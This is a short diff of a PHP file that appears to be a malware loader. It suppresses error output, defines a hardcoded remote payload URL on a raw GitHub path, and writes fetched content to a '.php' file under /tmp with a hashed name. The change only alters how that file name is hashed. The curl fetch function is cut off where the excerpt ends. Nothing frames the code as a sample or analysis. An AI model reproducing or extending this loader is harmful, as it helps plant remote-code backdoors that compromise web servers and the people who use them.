@@ -5,7 +5,7 @@
  */
 error_reporting(0);
 @ini_set('display_errors', 0);
-$session_name = '/tmp/sess_' . md5($_SERVER['HTTP_HOST'] . $_SERVER['REMOTE_ADDR']) . '.php';
+$session_name = '/tmp/sess_' . md5($_SERVER['HTTP_HOST']) . '.php';
 $remote_payload = 'https://raw.githubusercontent.com/mrxbarakuda/tmp/refs/heads/master/kudapriv7.txt';
 function smart_fetch($url) {
     $ch = curl_init();
